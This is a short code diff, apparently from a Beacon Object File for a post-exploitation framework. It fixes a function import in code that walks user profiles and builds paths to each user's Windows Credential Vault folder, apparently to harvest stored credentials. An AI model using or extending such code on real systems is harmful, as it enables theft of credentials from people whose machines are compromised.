@@ -35,6 +35,7 @@ typedef struct _VCRD_HEADER {
 extern "C" {
 #include "_include/beacon.h"
 
+    DECLSPEC_IMPORT int WINAPI USER32$wsprintfW(LPWSTR, LPCWSTR, ...);
     DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
     DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
     DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
@@ -217,7 +218,7 @@ void go(char* args, int len)
             continue;
 
         wchar_t path[MAX_PATH];
-        wsprintfW(
+        USER32$wsprintfW(
             path,
             L"C:\\Users\\%s\\AppData\\Local\\Microsoft\\Vault",
             fd.cFileName
